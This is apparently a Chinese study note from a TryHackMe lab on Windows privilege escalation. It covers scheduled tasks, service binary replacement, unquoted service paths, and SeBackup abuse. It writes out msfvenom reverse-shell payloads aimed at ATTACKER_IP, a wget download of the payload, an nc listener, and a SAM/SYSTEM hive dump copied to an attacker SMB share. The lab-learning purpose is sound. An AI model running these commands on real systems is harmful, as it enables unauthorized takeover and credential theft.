# window权限提升

Scheduled Tasks 计划任务



schtasks /query /tn vulntask /fo list /v

Task to Run  指示计划任务执行的内容

Run As User    显示将使用的用户执行任务。



如果我们的当前用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用icacls去检查哪个task to run 的程序

icacls   c:\task\schtask.bat

.>





Windows 服务
Windows 服务由服务控制管理器(SCM)管理。SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的过程。

Windows 机器上的每个服务都将有一个关联的可执行文件，每当服务启动时，该可执行文件将由 SCM 运行。重要的是要注意，服务可执行文件实现了能够与 SCM 通信的特殊功能，因此没有任何可执行文件可以作为服务成功启动。每项服务还指定服务将在其下运行的用户帐户。



sc qc + service name  #查看该服务的配置







服务可执行文件的不安全权限



如果与服务关联的可执行文件具有允许攻击者修改或替换它的弱权限，则攻击者可以轻而易举地获得服务帐户的特权

sc qc WindowsScheduler

icacls C:\PROGRA~2\SYSTEM~1\WService.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

python3 -m http.server

wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

cd C:\PROGRA~2\SYSTEM~1\

 move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe

icacls WService.exe /grant Everyone:F



nc -lvp 4445



从 cmd.exe 命令提示符使用以下命令：

sc stop windowsscheduler

sc start windowsscheduler





未引用的服务路径



msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

 move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

icacls C:\MyPrograms\Disk.exe /grant Everyone:F

sc stop "disk sorter enterprise"

sc start "disk sorter enterprise"





不安全的服务权限

C:\tools\AccessChk> accesschk64.exe -qlc thmservice

sc stop THMService

sc start THMService







## 滥用危险特权

SeBackup / SeRestore 备份

SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的DACL 。此权限背后的想法是允许某些用户在不需要完全管理权限的情况下从系统执行备份。





我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台：

whoami /priv

要备份 SAM 和 SYSTEM 哈希，我们可以使用以下命令：

reg save hklm\system C:\Users\THMBackup\system.hive 

reg save hklm\sam C:\Users\THMBackup\sam.hive

这将创建几个包含注册表配置单元内容的文件。我们现在可以使用 SMB 或任何其他可用方法将这些文件复制到我们的攻击者机器上。对于 SMB，我们可以使用 impacketsmbserver.py启动一个简单的 SMB 服务器，并在 AttackBox 的当前目录中进行网络共享：



mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share



这将创建一个名为public的共享，指向共享目录，这需要我们当前windows会话的用户名和密码。在这之后，我们可以在windows机器中使用复制命令，将这两个文件传输到我们的AttackBox：

 copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\

copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\





在这个房间里，我们介绍了 Windows 系统中可用的几种权限提升技术。这些技术应该为您提供关于攻击者可以用来提升系统特权的最常见路径的坚实背景。如果您有兴趣了解其他技术，可以使用以下资源：



感悟，thm只是起点。往后会有更多的提权方式要学习，慢慢来，量很大，急不得，要总结。 





winpeas 要执行exe

下载地址：https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

privesccheck powershell脚本，可替代winpeas，无需执行二进制文件

下载地址：https://github.com/itm4n/PrivescCheck



wes-ng

一些漏洞建议脚本（如winPEAS）将要求你将它们上传到目标系统并在那里运行。这可能会导致反病毒软件检测并删除它们。为了避免发出不必要的噪音而引起注意，你可能更喜欢使用WES-NG，它将在你的攻击机器上运行（如Kali或TryHackMe AttackBox）。

下载地址:https://github.com/bitsadmin/wesng

这个脚本运作原理，是在目标机的系统上运行systeminfo命令，将输入的信息定向到一个txt文件，把这个文件拿回来自己的机器上来分析



msf也可以提权，有一个叫multi/recon/local_exploit_suggester的模块，分析出可能影响目标系统的漏洞，并允许您提升您在目标系统上的权限。使用的前提条件是目标机上已经有一个meterpreter shell